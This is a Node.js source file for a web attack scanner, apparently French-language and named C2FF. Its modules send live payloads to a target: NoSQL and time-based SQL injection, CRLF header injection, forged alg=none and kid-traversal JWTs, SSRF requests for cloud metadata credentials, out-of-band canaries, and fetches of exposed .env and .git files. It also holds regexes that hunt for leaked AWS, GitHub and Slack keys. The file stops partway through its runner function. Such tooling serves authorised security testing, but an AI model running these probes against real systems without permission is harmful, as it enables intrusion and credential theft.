// ============================================================
// C2FF - attack.js : phase ATTACK - probes ciblees sur la surface reconnee
// Zero dependance, GET only, budget strict. Entree = surface du RECON
// (data/surface.json), sortie = candidates avec preuve (requete + reponse).
// Chaque candidate : requete en 1 ligne + reponse tronquee = PoC 3 etapes.
//
// Partie modes avances (12 modes, registry modules.ADV_MODES) :
//  - switch EXEC : une fonction dediee execute<Mode> par mode
//  - budget priorise par fleet.planBudget (P1 50% / P2 30% / P3 20%)
//  - delai adaptatif core/rateLimiter.js (double sur 429/timeout)
//  - baseline cachee baseline.js (DIFF_COMPARE lit le cache, jamais
//    une nouvelle requete de reference)
// Contrat des wrappers HTTP : docs/core.md.
// ============================================================
const https = require('https');
const http = require('http');
const { URL } = require('url');

const REQ_TIMEOUT = 6000, GAP_MS = 250;
const MAX_REQ = 70, MAX_EP = 20, MAX_JS = 8, MAX_PATHS = 12, MAX_FINDINGS = 30, JS_CAP = 200000;

// chemins a fort signal testes d'office sur la racine (docs et config exposes)
const KNOWN_PATHS = [
  ['/.env', 'env'], ['/swagger.json', 'swagger'], ['/openapi.json', 'swagger'],
  ['/api-docs', 'swagger'], ['/api/swagger.json', 'swagger'], ['/api/config', 'conf'],
  ['/actuator/health', 'actuator'], ['/actuator/env', 'actuator'], ['/config.json', 'conf'],
  ['/graphql', 'graphql'], ['/server-status', 'srv'], ['/.git/config', 'git'],
];

// secrets cherche dans les bundles JS
const SECRET_RES = [
  ['cle AWS en dur', /AKIA[0-9A-Z]{16}/g, 'P2'],
  ['token GitHub en dur', /gh[pousr]_[A-Za-z0-9]{36,50}/g, 'P2'],
  ['token Slack en dur', /xox[baprs]-[A-Za-z0-9-]{20,}/g, 'P2'],
  ['cle Google en dur', /AIza[0-9A-Za-z_\-]{35}/g, 'P2'],
  ['cle privee embarquee', /-----BEGIN [A-Z ]*PRIVATE KEY-----/g, 'P2'],
  ['secret en dur dans le code', /(?:secret|passw(?:or)?d|token|api_?key)["']?\s*[:=]\s*["'][A-Za-z0-9_\-]{16,48}["']/gi, 'SIG'],
  ['bearer colle dans le bundle', /(?:bearer|authorization)["'\s:]{1,4}(eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,})/gi, 'SIG'],
];

const JWT_RE = /eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{4,}\.[A-Za-z0-9_\-]{4,}/;
const EMAIL_RE = /[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}/i;
const TRACE_RE = /at \/[\w./-]+:\d+|Traceback \(most recent|java\.lang\.\w+Exception|Fatal error.*\.php on line/;

function get(url, hh, max) {
  return new Promise(res => {
    let req0;
    try { req0 = https.get(url, { headers: { 'user-agent': 'Mozilla/5.0 (C2FF-attack)', accept: '*/*', ...(hh || {}) }, timeout: REQ_TIMEOUT }, r => {
      let raw = ''; let n = 0;
      r.on('data', d => { n += d.length; if (n <= (max || 150000)) raw += d; else r.destroy(); });
      r.on('end', () => res({ code: r.statusCode || 0, headers: r.headers || {}, body: raw }));
      r.on('error', () => res({ code: 0, headers: {}, body: '' }));
      r.on('aborted', () => res({ code: 0, headers: {}, body: '' }));
    }); } catch (e) { return res({ code: 0, headers: {}, body: '' }); }
    req0.on('timeout', () => { try { req0.destroy(); } catch (e) {} res({ code: 0, headers: {}, body: '' }); });
    req0.on('error', () => res({ code: 0, headers: {}, body: '' }));
  });
}
const sleep = ms => new Promise(r => setTimeout(r, ms));
const clip = (s, n) => String(s || '').replace(/\s+/g, ' ').trim().slice(0, n);

function jwtClaims(t) {
  const p = String(t).split('.');
  if (p.length < 2) return null;
  const b64d = s => { try { return JSON.parse(Buffer.from(s.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('utf8')); } catch (e) { return null; } };
  const h = b64d(p[0]), b = b64d(p[1]);
  return (h && b) ? { h, b } : null;
}

async function attack(surf, header, log) {
  const T0 = Date.now();
  const base = 'https://' + (surf.host || '');
  const hh = { ...(header || {}) };
  const out = [], seen = new Set();
  let nreq = 0;
  const add = (sev, mod, title, req, resTxt) => {
    const k = mod + ':' + title;
    if (seen.has(k) || out.length >= MAX_FINDINGS) return;
    seen.add(k);
    out.push({ sev, mod, title: clip(title, 90), req: clip(req, 180), res: clip(resTxt, 260) });
    if (log) log('▸ [' + sev + '] ' + title);
  };

  async function probe(path, extra, max) {
    if (nreq >= MAX_REQ || !path || !path.startsWith('/')) return null;
    nreq++;
    const r = await get(base + path, { ...hh, ...(extra || {}) }, max);
    if (log) log('├ ' + (r.code || 'ERR') + ' ' + path.slice(0, 60));
    await sleep(GAP_MS);
    return r;
  }

  // ---- 1. endpoints API du RECON : auth, CORS, JWT, stack traces ----
  const eps = [...new Set((surf.apis || []).map(a => String(a).split('?')[0]))].slice(0, MAX_EP);
  for (const ep of eps) {
    const r = await probe(ep, { origin: 'https://c2ff-probe.example' });
    if (!r.code) continue;
    const acao = r.headers['access-control-allow-origin'], acac = r.headers['access-control-allow-credentials'];
    if (acao === 'https://c2ff-probe.example' && acac === 'true') add('P2', 'cors', 'CORS reflechi avec credentials sur ' + ep, 'GET ' + ep + ' | Origin: https://c2ff-probe.example', r.body);
    if (r.code === 200 && r.body) {
      const b = r.body.slice(0, 3000);
      if (EMAIL_RE.test(b) || (b[0] === '[' && b.length > 60)) add('P2', 'auth', 'endpoint API non authentifie qui expose des donnees : ' + ep, 'GET ' + ep, r.body);
      else if (r.code === 200 && !/error|denied|unauthor|forbidden/i.test(b.slice(0, 200))) add('SIG', 'auth', 'endpoint API repond 200 sans auth : ' + ep, 'GET ' + ep, r.body);
    }
    if (r.body && TRACE_RE.test(r.body)) add('SIG', 'info', 'stack trace visible sur ' + ep, 'GET ' + ep, r.body);
    const jt = (r.body.match(JWT_RE) || [])[0];
    if (jt) {
      const c = jwtClaims(jt);
      if (c) {
        if (c.h.alg === 'none' || !c.h.alg) add('P2', 'jwt', 'JWToken sans signature (alg none) emis par ' + ep, 'GET ' + ep, 'header=' + JSON.stringify(c.h));
        if (String(c.h.kid || '').includes('..') || String(c.h.kid || '').startsWith('/')) add('P2', 'jwt', 'JWToken kid manipulable (traversal) : ' + ep, 'GET ' + ep, 'kid=' + c.h.kid);
        if (!c.b.exp) add('SIG', 'jwt', 'JWT sans expiration emis : ' + ep, 'GET ' + ep, JSON.stringify(c.b).slice(0, 120));
        else if (String(c.b.role || c.b.admin || '').match(/admin|root|su/i)) add('SIG', 'jwt', 'JWT avec role eleve : ' + ep, 'GET ' + ep, JSON.stringify(c.b).slice(0, 120));
      }
    }
  }
  if (log) log('├ API probee : ' + eps.length + ' endpoints, ' + nreq + ' req');

  // ---- 2. chemins a fort signal : config et docs exposes ----
  for (const [p2, kind] of KNOWN_PATHS.slice(0, MAX_PATHS)) {
    const r = await probe(p2, null, 60000);
    if (!r.code || r.code === 404 || r.code === 403) continue;
    const b = r.body.slice(0, 4000);
    if (kind === 'env' && r.code === 200 && /[A-Z0-9_]+=/.test(b) && /(?:key|secret|pass|token|db|env)/i.test(b)) add('P1', 'exposure', 'fichier .env expose avec variables', 'GET ' + p2, b);
    else if (kind === 'git' && r.code === 200 && b.includes('[core]')) add('P2', 'exposure', 'repo git expose (.git/config)', 'GET ' + p2, b);
    else if (kind === 'swagger' && r.code === 200 && /"(?:paths|openapi|swagger)"/.test(b)) {
      const n = (b.match(/\//g) || []).length;
      add(n > 12 ? 'P2' : 'SIG', 'exposure', 'documentation API exposee : ' + p2, 'GET ' + p2, b.slice(0, 160));
    }
    else if (kind === 'actuator' && r.code === 200 && /status|env/.test(b)) add('P2', 'exposure', 'actuator expose : ' + p2, 'GET ' + p2, b.slice(0, 160));
    else if (kind === 'graphql' && r.code === 200 && /error|schema|query|missing/i.test(b)) add('SIG', 'exposure', 'endpoint graphql ouvert : ' + p2, 'GET ' + p2, b.slice(0, 160));
    else if (kind === 'srv' && r.code === 200) add('SIG', 'exposure', 'server-status expose : ' + p2, 'GET ' + p2, b.slice(0, 160));
    else if (kind === 'conf' && r.code === 200 && r.headers['content-type'].includes('json') && /key|secret|token|pass/i.test(b)) add('P2', 'exposure', 'config JSON exposee : ' + p2, 'GET ' + p2, b.slice(0, 160));
  }

  // ---- 3. secrets dans les bundles JS du RECON ----
  const files = [...new Set((surf.jsfiles || []))].slice(0, MAX_JS);
  for (const u of files) {
    const r = await probe(u.replace(/^https?:\/\/[^/]+/, '') || '/', null, JS_CAP);
    if (!r || !r.body) continue;
    for (const [name, re, sev] of SECRET_RES) {
      re.lastIndex = 0;
      const m = re.exec(r.body);
      if (m) add(sev, 'secrets', name + ' : ' + (u.split('/').pop() || u).slice(0, 40), 'GET ' + u, clip(m[0], 80));
    }
  }
  if (log) log('├ bundles scans : ' + files.length);

  return { ts: new Date().toISOString(), ms: Date.now() - T0, reqs: nreq, ep: eps.length, js: files.length, findings: out };
}

// ============================================================
// MODES AVANCES - execution
// ============================================================
const MODULES = require('./modules.js');
const BASELINE = require('./baseline.js');
const RL = require('./core/rateLimiter.js');
const FLEET = require('./fleet.js');
const crypto = require('crypto');

// wrapper HTTP bas niveau des modes avances. Contrat (docs/core.md) :
// entree areq(url, {hdrs, timeout, method, body}) -> Promise
//   { code, headers, body, ms, timedOut } - jamais de throw, code 0 = erreur.
function areq(url, opts) {
  const o = opts || {};
  return new Promise(res => {
    let u; try { u = new URL(url); } catch (e) { return res({ code: 0, headers: {}, body: '', ms: 0, timedOut: false }); }
    const mod = u.protocol === 'http:' ? http : https;
    const T0 = Date.now();
    let settled = false;
    const done = r => { if (!settled) { settled = true; r.ms = Date.now() - T0; res(r); } };
    const payload = o.body ? (typeof o.body === 'string' ? o.body : JSON.stringify(o.body)) : null;
    let rq;
    try {
      rq = mod.request(url, {
        method: o.method || 'GET',
        headers: { 'user-agent': 'Mozilla/5.0 (C2FF-attack-adv)', accept: '*/*', ...(o.hdrs || {}), ...(o.body ? { 'content-type': 'application/json', 'content-length': Buffer.byteLength(payload || '') } : {}) },
        timeout: o.timeout || 10000,
        rejectUnauthorized: false,
      }, r => {
        const chunks = []; let n = 0;
        r.on('data', c => { n += c.length; if (n <= 1000000) chunks.push(c); else r.destroy(); });
        r.on('end', () => done({ code: r.statusCode || 0, headers: r.headers || {}, body: Buffer.concat(chunks).toString('utf8'), ms: Date.now() - T0, timedOut: false }));
        r.on('error', () => done({ code: r.statusCode || 0, headers: r.headers || {}, body: '', ms: Date.now() - T0, timedOut: false }));
      });
    } catch (e) { return done({ code: 0, headers: {}, body: '', ms: Date.now() - T0, timedOut: false }); }
    rq.on('timeout', () => { try { rq.destroy(); } catch (e) {} done({ code: 0, headers: {}, body: '', ms: Date.now() - T0, timedOut: true }); });
    rq.on('error', () => done({ code: 0, headers: {}, body: '', ms: Date.now() - T0, timedOut: false }));
    if (payload) rq.write(payload);
    rq.end();
  });
}

// payload custom (config.json advanced_hacks.payloads_custom) ou defaut
const customPayload = (custom, key, def) => (Array.isArray(custom && custom[key]) && custom[key].length ? custom[key] : def);
const canaryR = () => 'c2ff' + crypto.randomBytes(3).toString('hex');

// fabrique le contexte d'un mode : budget de sa priorite, wrapper limite,
// baseline, params/endpoints de la surface. Le switch EXEC le consomme.
function mkCtx(mode, meta, env) {
  const prio = meta.riskLevel;
  const ctx = {
    mode, prio, cwe: meta.cwe,
    base: env.base, hh: env.hh, custom: env.custom,
    params: env.params, endpoints: env.endpoints,
    reqs: 0, alerts: [], notes: [],
    // probe() : LE SEUL chemin reseau d'un mode. Decompte la priorite
    // du mode, passe par le rateLimiter (gap adaptatif + record), et
    // retourne null si le budget de la priorite est epuise.
    async probe(url, opts) {
      if (env.remaining[prio] <= 0) return null;
      env.remaining[prio]--;
      ctx.reqs++;
      env.reqs++;
      // chemin relatif autorise : les modes construisent depuis ctx.endpoints
      const full = /^https?:\/\//i.test(url) ? url : env.base + url;
      const o = { ...opts, timeout: opts && opts.timeout || (env.timeouts[mode] || env.timeouts.default || 10000) };
      return env.rl.request(() => areq(full, { ...o, hdrs: { ...env.hh, ...(o && o.hdrs) } }));
    },
    // alerte : severity = riskLevel du mode ou plus bas (SIG pour info)
    alert(title, payload, r, evidence, extra) {
      const a = {
        mode, sev: meta.riskLevel, cwe: meta.cwe, title: String(title).slice(0, 120),
        payload: String(payload || '').slice(0, 160),
        status: r ? r.code : 0,
        evidence: String(evidence || '').replace(/\s+/g, ' ').trim().slice(0, 260),
        ms: r ? r.ms : undefined, ...(extra || {}),
      };
      ctx.alerts.push(a);
      if (env.log) env.log('  ▸ [' + meta.riskLevel + '][' + mode + '] ' + a.title);
    },
    note(t) { ctx.notes.push(String(t).slice(0, 160)); if (env.log) env.log('  · [' + mode + '] ' + t); },
  };
  return ctx;
}

// ecart vs baseline : true si |len - baseline| > 20% (seuil DIFF_COMPARE)
const lenDelta20 = (len, base) => base && base.len ? Math.abs(len - base.len) / base.len > 0.2 : false;

// ---------------- 12 fonctions execute<Mode> ----------------
const EXEC = {

  // NO_SQLI : operateurs $ne / $regex dans les params JSON/URL.
  // Reponse qui refuse les operateurs ou renvoie PLUS de donnees que la
  // baseline = reflection d'operateur -> auth bypass NoSQL (P1).
  async NO_SQLI(ctx) {
    const payloads = customPayload(ctx.custom, 'no_sqli', ['[ne]=null', '[regex]=.*']);
    let used = 0;
    for (const p of ctx.params) {
      if (used >= 6) break;
      for (const ep of ctx.endpoints.slice(0, 2)) {
        const sep = ep.includes('?') ? '&' : '?';
        for (const pay of payloads) {
          const url = ep + sep + encodeURIComponent(p + pay.split('=')[0]) + '=' + encodeURIComponent(pay.split('=').slice(1).join('='));
          const r = await ctx.probe(url);
          used++;
          if (!r) return;
          const base = BASELINE.getBaseline(env(ctx).progId, ep);
          const opEcho = /\$ne|\$regex|\[ne\]|\[regex\]/i.test(r.body);
          const moreData = lenDelta20(r.body.length, base) && r.code === 200;
          if (r.code === 200 && (opEcho || moreData)) {
            ctx.alert('reflection d\'operateur NoSQL sur ?' + p + ' (' + (opEcho ? 'operateur echo' : 'donnees en plus vs baseline') + ')', p + ' -> ' + pay, r, r.body.slice(0, 160));
            return;
          }
        }
      }
    }
    if (!used) ctx.note('aucun param testable : lance URLS/RECON pour miner les params');
  },

  // HEADER_INJECT : CRLF (%0d%0a) envoye dans Host / X-Forwarded-For /
  // User-Agent (et en path). En-tete duplique dans la reponse ou cookie
  // inattendu vs baseline = response splitting (P2).
  async HEADER_INJECT(ctx) {
    const MARK = 'X-Injected: c2ff';
    const tries = [
      ['host', 'c2ff-probe.example%0d%0a' + MARK],
      ['x-forwarded-for', '127.0.0.1%0d%0a' + MARK],
      ['user-agent', 'Mozilla/5.0 C2FF%0d%0a' + MARK],
    ];
    const base0 = BASELINE.getBaseline(env(ctx).progId, '/');
    for (const [h, v] of tries) {
      const r = await ctx.probe(ctx.base + '/', { hdrs: { [h]: v } });
      if (!r) return;
      const injected = Object.keys(r.headers || {}).some(k => k === 'x-injected') || /x-injected/i.test(r.body);
      const sc = (r.headers || {})['set-cookie'] || [];
      const newCookie = sc.length > 0 && base0 && base0.ck === 0;
      if (injected) {
        ctx.alert('CRLF reflechi via ' + h + ' : en-tete duplique X-Injected', h + ': ' + v, r, JSON.stringify(r.headers).slice(0, 200));
        return;
      }
      if (newCookie) {
        ctx.alert('cookie inattendu apres CRLF via ' + h, h + ': ' + v, r, JSON.stringify((r.headers || {})['set-cookie']).slice(0, 160));
        return;
      }
      // variante path : le CRLF passe dans l'URL
      const r2 = await ctx.probe(ctx.base + '/%0d%0a' + MARK);
      if (r2 && (r2.headers && r2.headers['x-injected'] || /x-injected/i.test(r2.body))) {
        ctx.alert('CRLF reflechi via path', 'GET /%0d%0a' + MARK, r2, (r2.body || '').slice(0, 160));
        return;
      }
    }
  },

  // JWT_ADV : JWT forges alg=none et kid=../../../dev/null envoyes sur un
  // endpoint protege. 200 avec donnees protegees (vs baseline 401) = P1.
  async JWT_ADV(ctx) {
    // 1. trouver un JWT : corps des baselines, sinon impossible de forger
    let tok = null, claims = null;
    const b = BASELINE.load()[env(ctx).progId] || {};
    for (const ep of Object.keys(b)) {
      const m = /eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{4,}\.[A-Za-z0-9_\-]{4,}/.exec(b[ep].body || '');
      if (m) { tok = m[0]; break; }
    }
    if (!tok) { ctx.note('aucun JWT connu : lance AUTH/ATTACK pour en capturer un, puis relance'); return; }
    const b64u = o => Buffer.from(JSON.stringify(o)).toString('base64url');
    let head, body;
    try { head = JSON.parse(Buffer.from(tok.split('.')[0], 'base64url').toString()); body = JSON.parse(Buffer.from(tok.split('.')[1], 'base64url').toString()); } catch (e) { ctx.note('JWT illisible'); return; }
    const ep = ctx.endpoints[0] || '/';
    const algNone = b64u({ ...head, alg: 'none' }) + '.' + b64u(body) + '.';
    const kidTrav = b64u({ ...head, alg: head.alg || 'HS256', kid: '../../../dev/null' }) + '.' + b64u(body) + '.c2ffsig';
    for (const [label, t] of [['alg=none', algNone], ['kid=../../../dev/null', kidTrav]]) {
      const r = await ctx.probe(ep, { hdrs: { authorization: 'Bearer ' + t } });
      if (!r) return;
      if (r.code === 200 && r.body.length > 0 && !/unauthor|forbidden|invalid|denied/i.test(r.body.slice(0, 200))) {
        ctx.alert('JWT forge ' + label + ' accepte : donnees protegees sur ' + ep, 'Authorization: Bearer <jwt ' + label + '>', r, r.body.slice(0, 160));
        return;
      }
    }
  },

  // BLIND_SQL : SQLi aveugle temporisee. ' OR SLEEP(5)-- (MySQL) puis
  // '; WAITFOR DELAY '0:0:5'-- (MSSQL). Latence mesuree et affichee ;
  // >= 4.5 s (vs baseline) = time-based SQLi (P1). Timeout du mode : 15 s.
  async BLIND_SQL(ctx) {
    const payloads = customPayload(ctx.custom, 'blind_sql', ["' OR SLEEP(5)-- ", "'; WAITFOR DELAY '0:0:5'-- "]);
    let used = 0;
    for (const p of ctx.params.slice(0, 3)) {
      const ep = ctx.endpoints.find(e => e.includes(p)) || ctx.endpoints[0] || '/';
      const sep = ep.includes('?') ? '&' : '?';
      for (const pay of payloads) {
        const url = ep + sep + encodeURIComponent(p) + '=' + encodeURIComponent(pay);
        const r = await ctx.probe(url, { timeout: env(ctx).timeouts.BLIND_SQL || 15000 });
        used++;
        if (!r) return;
        const base = BASELINE.getBaseline(env(ctx).progId, ep);
        const slow = r.ms >= 4500 && (!base || !base.ms || r.ms >= base.ms + 4000);
        if (slow) {
          ctx.alert('latence ' + (r.ms / 1000).toFixed(1) + 's sur ?' + p + ' : SQLi temporisee (' + (pay.includes('SLEEP') ? 'MySQL' : 'MSSQL') + ')', p + '=' + pay, r, 'baseline ' + (base && base.ms || 0) + 'ms -> ' + r.ms + 'ms');
          return;
        }
      }
    }
    if (!used) ctx.note('aucun param testable : lance URLS/RECON pour miner les params');
  },

  // ACTUATOR_ADV : actuator Spring exposes. env / heapdump / threaddump
  // en 200 avec donnees sensibles = P2 (exposition de configuration).
  async ACTUATOR_ADV(ctx) {
    const paths = ['/actuator', '/actuator/env', '/actuator/heapdump', '/actuator/threaddump'];
    for (const p of paths) {
      const r = await ctx.probe(ctx.base + p);
      if (!r) return;
      if (r.code !== 200) continue;
      const b = r.body || '';
      const sens = (p.endsWith('/env') && /propertySources|\{[a-z].*\}/.test(b.slice(0, 2000)) && /password|secret|key|token|url/i.test(b))
        || (p.endsWith('/heapdump') && (/octet-stream/i.test(r.headers['content-type'] || '') || b.length > 100000))
        || (p.endsWith('/threaddump') && /"threads"|"threadState"|"stackTrace"/.test(b))
        || (p === '/actuator' && /"_links"|health|env|heapdump/.test(b) && /env|heapdump/.test(b));
      if (sens) {
        ctx.alert('actuator sensible expose : ' + p, 'GET ' + p, r, (r.headers['content-type'] || '') + ' ' + b.length + ' o ' + clip(b, 100));
        return;
      }
    }
  },

  // AWS_META : SSRF vers les metadata cloud via les params de fetch :
  // AWS 169.254.169.254/.../security-credentials, GCP metadata.google.internal
  // (+ header Metadata-Flavor), Azure /metadata/instance. Reponse qui
  // contient iam/instance-id/service-accounts/AccessKeyId = P2.
  async AWS_META(ctx) {
    const targets = [
      'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/',
      'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
    ];
    const RX = /iam\/security-credentials|instance-id|service-accounts|accessKeyId|secretAccessKey|accountId/i;
    let used = 0;
    for (const p of ctx.params.slice(0, 2)) {
      for (const t of targets) {
        const ep = ctx.endpoints.find(e => e.includes(p)) || ctx.endpoints[0] || '/';
        const sep = ep.includes('?') ? '&' : '?';
        const r = await ctx.probe(ep + sep + encodeURIComponent(p) + '=' + encodeURIComponent(t), { hdrs: t.includes('google') ? { 'metadata-flavor': 'Google' } : {} });
        used++;
        if (!r) return;
        if (RX.test(r.body)) {
          ctx.alert('metadata cloud lue via ?' + p + ' (SSRF)', p + '=' + t, r, r.body.slice(0, 160));
          return;
        }
      }
    }
    if (!used) ctx.note('aucun param de fetch candidat : lance URLS/RECON');
  },

  // GRAPHQL_INTRO : introspection ouverte. POST {__schema{types{name}}}
  // sur /graphql et /api/graphql ; __schema dans la reponse = P3.
  async GRAPHQL_INTRO(ctx) {
    for (const p of ['/graphql', '/api/graphql']) {
      const r = await ctx.probe(ctx.base + p, { method: 'POST', body: { query: '{__schema{types{name}}}' } });
      if (!r) return;
      if (r.code === 200 && /__schema|"types"\s*:/.test(r.body) && !/introspection.*(disabled|forbidden)/i.test(r.body)) {
        ctx.alert('introspection GraphQL ouverte : ' + p, 'POST {"query":"{__schema{types{name}}}"}', r, r.body.slice(0, 160));
        return;
      }
    }
  },

  // SESSION_FIX : cookie sessionid impose a l'attaquant. Si la reponse
  // re-emet NOTRE valeur en Set-Cookie (reflexion) la session est
  // fixable (P2).
  async SESSION_FIX(ctx) {
    const val = 'c2ff' + canaryR() + 'fixe';
    const r = await ctx.probe(ctx.base + '/', { hdrs: { cookie: 'sessionid=' + val } });
    if (!r) return;
    const sc = (r.headers || {})['set-cookie'] || [];
    if (sc.some(c => c.includes('sessionid=' + val))) {
      ctx.alert('sessionid impose re-emetu par le serveur : fixation possible', 'Cookie: sessionid=' + val, r, JSON.stringify(sc).slice(0, 180));
    }
  },

  // VERSION_CRAWL : fichiers de version et manifestes exposes :
  // /version, /api/version, /info, /.git/HEAD, /composer.json.
  // Version semver visible ou .git/HEAD 200 = P3 (empreinte exacte).
  async VERSION_CRAWL(ctx) {
    const paths = ['/version', '/api/version', '/info', '/.git/HEAD', '/composer.json'];
    for (const p of paths) {
      const r = await ctx.probe(ctx.base + p);
      if (!r) return;
      if (r.code !== 200 || !r.body) continue;
      const b = r.body.slice(0, 2000);
      if (p === '/.git/HEAD') {
        if (/ref:\s*refs\//.test(b)) { ctx.alert('.git/HEAD expose : branche visible', 'GET /.git/HEAD', r, b.slice(0, 120)); return; }
        continue;
      }
      const vm = /\b(\d+\.\d+(?:\.\d+)+)\b/.exec(b);
      if (vm && !/<html/i.test(b)) {
        ctx.alert('version trouvee (' + vm[1] + ') : ' + p, 'GET ' + p, r, b.replace(/\s+/g, ' ').slice(0, 140));
        return;
      }
    }
  },

  // DIFF_COMPARE : differentiel ?id=1 vs ?id=2 CONTRE LA BASELINE CACHEE.
  // Lit baseline.js - jamais de nouvelle requete de reference : un
  // endpoint sans baseline est note et saute. Ecart > 20% = P3 (IDs
  // numeriques sensibles a confirmer).
  async DIFF_COMPARE(ctx) {
    const progId = env(ctx).progId;
    const eps = ctx.endpoints.filter(e => /id=|\/\d{2,}/.test(e)).slice(0, 3);
    let used = 0;
    for (const ep of eps.length ? eps : ctx.endpoints.slice(0, 2)) {
      const base = BASELINE.getBaseline(progId, ep);
      if (!base) { ctx.note('pas de baseline pour ' + ep + ' : lance BASELINE puis relance'); continue; }
      for (const v of ['1', '2']) {
        const sep = ep.includes('?') ? '&' : '?';
        const url = /\bid=/.test(ep) ? ep.replace(/(\bid=)\d+/, '$1' + v) : ep + sep + 'id=' + v;
        const r = await ctx.probe(url);
        used++;
        if (!r) return;
        const d = BASELINE.lenDelta(r.body.length, base);
        if (d !== null && d > 0.2) {
          ctx.alert('ecart ' + Math.round(d * 100) + '% vs baseline sur ' + ep + ' (id=' + v + ')', url, r, 'baseline ' + base.len + ' o -> ' + r.body.length + ' o');
        }
      }
    }
    if (!used) ctx.note('aucun endpoint avec id : lance URLS/RECON');
  },

  // OAUTH_MIS : /.well-known/openid-configuration (SIG si decouverte
  // ouverte) puis /oauth/authorize?response_type=token&client_id=any :
  // access_token dans l'URL de redirection = implicit flow mal configure (P2).
  async OAUTH_MIS(ctx) {
    const r1 = await ctx.probe(ctx.base + '/.well-known/openid-configuration');
    if (!r1) return;
    if (r1.code === 200 && /authorization_endpoint|issuer/.test(r1.body)) {
      ctx.alert('openid-configuration publique (recon OAuth possible)', 'GET /.well-known/openid-configuration', r1, r1.body.slice(0, 160), { sev: 'SIG' });
      const iss = (/"authorization_endpoint"\s*:\s*"([^"]+)"/.exec(r1.body) || [])[1];
      const ep = iss && iss.startsWith('/') ? iss : (iss ? new URL(iss, ctx.base).toString() : ctx.base + '/oauth/authorize');
      const sep = ep.includes('?') ? '&' : '?';
      const r2 = await ctx.probe(ep + sep + 'response_type=token&client_id=any&redirect_uri=' + encodeURIComponent(ctx.base + '/cb'), { timeout: env(ctx).timeouts.default });
      if (r2 && (r2.code === 302 || r2.code === 303 || r2.code === 301) && /access_token=/.test(r2.headers.location || '')) {
        ctx.alert('access_token dans l\'URL de redirection (implicit flow)', 'response_type=token&client_id=any', r2, String(r2.headers.location).slice(0, 180));
      }
      return;
    }
    const r2 = await ctx.probe(ctx.base + '/oauth/authorize?response_type=token&client_id=any&redirect_uri=' + encodeURIComponent(ctx.base + '/cb'));
    if (r2 && [301, 302, 303, 307].includes(r2.code) && /access_token=/.test(r2.headers.location || '')) {
      ctx.alert('access_token dans l\'URL de redirection (implicit flow)', 'response_type=token&client_id=any', r2, String(r2.headers.location).slice(0, 180));
    }
  },

  // DNS_OOB : XXE/SSRF out-of-band vers TON domaine OOB (config.json
  // payloads_custom.oob_domain - Burp Collaborator ou equivalent).
  // Interaction DNS capturable seulement si oob_check_url est fourni
  // (API du serveur externe) - sinon SIG "a verifier sur ta console".
  async DNS_OOB(ctx) {
    const dom = ctx.custom && ctx.custom.oob_domain;
    if (!dom) { ctx.note('configure payloads_custom.oob_domain dans config.json (Collaborator, interactsh...)'); return; }
    const canary = 'c2ff' + canaryR() + '.' + dom;
    const params = ['xml', 'soap', 'doc', 'url', 'feed', 'redirect', 'fetch'];
    let used = 0;
    for (const p of params.slice(0, 4)) {
      const ep = ctx.endpoints[0] || '/';
      const sep = ep.includes('?') ? '&' : '?';
      const r = await ctx.probe(ep + sep + encodeURIComponent(p) + '=' + encodeURIComponent('http://' + canary), { timeout: env(ctx).timeouts.DNS_OOB || 8000 });
      used++;
      if (!r) return;
      if (r.body && r.body.includes(canary)) {
        ctx.alert('payload OOB reflechi via ?' + p + ' : interaction DNS a confirmer sur ' + dom, p + '=http://' + canary, r, r.body.slice(0, 140));
        return;
      }
    }
    const check = ctx.custom && ctx.custom.oob_check_url;
    if (check) {
      const rc = await ctx.probe(check, { timeout: env(ctx).timeouts.DNS_OOB || 8000 });
      if (rc && rc.body && rc.body.includes(canary.split('.')[0])) {
        ctx.alert('resolution DNS captree sur ton serveur OOB', canary, rc, rc.body.slice(0, 160));
        return;
      }
    }
    ctx.note('interactions a verifier sur ta console OOB : ' + canary);
  },
};

// acces a l'env du runner depuis un ctx (les exec sont des closures simples)
const envs = new Map();
function env(ctx) { return envs.get(ctx) || {}; }

// ---------------- runner budgete ----------------
// selected = liste de cles ADV_MODES ; l'ordre est priorise (P1 d'abord).
// Chaque mode tourne jusqu'a epuisement de SON pool de priorite
// (P1 50% / P2 30% / P3 20% du budget total, fleet.planBudget).
async function advancedRun(surf, prog, header, selected, cfg, log) {
  const T0 = Date.now();
  const cfgA = (cfg && cfg.advanced_hacks) || {};
  const budget = cfgA.budget || 60;
  const pools = FLEET.planBudget(budget);
  const remaining = { ...pools };
  const filter = cfgA.priority_filter || ['P1', 'P2'];
  const timeouts = { default: 10000, ...((cfgA.timeouts || {})) };
  const custom = cfgA.payloads_custom || {};
  const rl = RL.create({ baseGapMs: cfgA.base_gap_ms || 1000 });
  const host = surf.host || '';
  const base = /^https?:\/\//.test(host) ? host.replace(/\/+$/, '') : 'https://' + host.replace(/\/+$/, '');
  // params de la surface (strings ou {p,n}) - bruit CDN/tracking exclu
  const NOISE = /_csrf|^csrf|^xsrf|^utm_|^fbclid|^_ga|^sessionid|^sid$/i;
  const params = [...new Set((surf.params || []).map(p => p.p || p))].filter(p => p && !NOISE.test(p));
  const endpoints = [...new Set([...(surf.apis || []).map(a => String(a).split('#')[0]), '/'])].slice(0, 12);
  const env = { progId: prog.id, base, hh: header || {}, custom, remaining, reqs: 0, timeouts, rl, log, params, endpoints };

  const out = [];
  const keys = (selected || Object.keys(MODULES.ADV_MODES)).filter(k => MODULES.ADV_MODES[k]);
  keys.sort((a, b) => ({ P1: 0, P2: 1, P3: 2 }[MODULES.ADV_MODES[a].riskLevel] - { P1: 0, P2: 1, P3: 2 }[MODULES.ADV_MODES[b].riskLevel]));
  for (const k of keys) {
    const meta = MODULES.ADV_MODES[k];
    if (!filter.includes(meta.riskLevel)) { out.push({ mode: k, riskLevel: meta.riskLevel, cwe: meta.cwe, reqs: 0, skipped: 'hors priority_filter' }); continue; }
    if (remaining[meta.riskLevel] <= 0) { out.push({ mode: k, riskLevel: meta.riskLevel, cwe: meta.cwe, reqs: 0, skipped: 'budget ' + meta.riskLevel + ' epuise' }); continue; }
    const ctx = mkCtx(k, meta, env);
